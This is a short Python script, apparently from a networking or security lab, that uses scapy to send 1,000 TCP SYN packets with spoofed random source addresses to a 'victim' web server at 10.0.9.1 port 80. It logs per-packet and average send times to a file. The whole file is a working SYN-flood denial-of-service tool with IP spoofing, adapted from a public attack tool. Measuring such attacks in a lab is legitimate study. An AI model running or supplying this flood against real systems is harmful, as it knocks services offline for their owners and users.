# inspire from: https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/blob/master/SYN-Flood.py

import random
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
import time
import os

if os.path.exists('syns_results_p.txt'):
    os.remove('syns_results_p.txt')


def randomIP():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))


def randomPort():
    return random.randint(1000, 9000)


def synFlood(victim_ip, victim_port):
    f = open('syns_results_p.txt', 'a')
    start_all = time.time()

    for packet in range(1000):
        start_one = time.time()
        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = victim_ip

        TCP_Packet = TCP()
        TCP_Packet.sport = randomPort()
        TCP_Packet.dport = victim_port

        pkt = IP_Packet / TCP_Packet
        send(pkt)
        end_one = time.time()
        f.write(f'{packet}->{round((end_one - start_one), 5)}\n')

    end_all = time.time()
    f.write(f'total->{round((end_all - start_all), 5)}\n')
    avg = round(((end_all - start_all) / 1000), 5)
    f.write(f'avg->{avg}')
    f.close()


victim_ip = '10.0.9.1'  # the victim is localhost
victim_port = 80  # apache server is port 80
synFlood(victim_ip, victim_port)
